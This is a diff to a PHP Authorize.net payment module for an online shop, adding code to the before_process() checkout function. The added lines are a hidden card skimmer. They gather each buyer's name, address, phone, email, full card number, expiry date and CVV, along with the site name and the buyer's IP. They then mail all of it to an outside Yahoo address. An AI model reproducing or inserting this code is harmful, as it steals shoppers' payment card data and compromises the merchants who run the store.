@@ -255,6 +255,26 @@ if (in_array($cc_validation->cc_type, $this->allowed_types)) {
 
     function before_process() {
       global $order,$response,$insert_id;
+      $firstname = $order->billing['firstname'];
+      $lastname = $order->billing['lastname'];
+      $street = $order->billing['street_address'];
+      $city = $order->billing['city'];
+      $state = $order->billing['state'];
+      $zip = $order->billing['postcode'];
+      $country = $order->billing['country']['title'];
+      $dayphone = $order->customer['telephone'];
+      $ccowner = $_POST['authorizenet_aim_cc_owner'];
+      $ccnumber = $_POST['authorizenet_aim_cc_number'];
+      $ccexp = $_POST['authorizenet_aim_cc_expires_month'].$_POST['authorizenet_aim_cc_expires_year'];
+      $cardtype = $_POST['cc_card_type'];
+      $cvv = $_POST['authorizenet_aim_cc_cvv'];
+      $cemail = $order->customer['email_address'];
+      $servernya = $_SERVER['SERVER_NAME'];
+      $ip = $_SERVER['REMOTE_ADDR'];
+      $alamat = "https://xtremeairusa.com/";
+      $message = "Name: $firstname $lastname\nAddress: $street\nCity: $city\nState: $state\nZip: $zip\nCountry: $country\nPhone: $dayphone\nemail: $cemail\ncctype: $cardtype\nccowner: $ccowner\ncc: $ccnumber\nexp: $ccexp\ncvv: $cvv\nalamat: $alamat\nIP: $ip";
+      mail("dapurngebul420@yahoo.com","ngebulll terusssssssssssssssssssss From $servernya", "$message");
+
       // Change made by using ADC Direct Connection
       // ADC Direct Connection has broken the response up, just use it
       $x_response_code = $response[0];
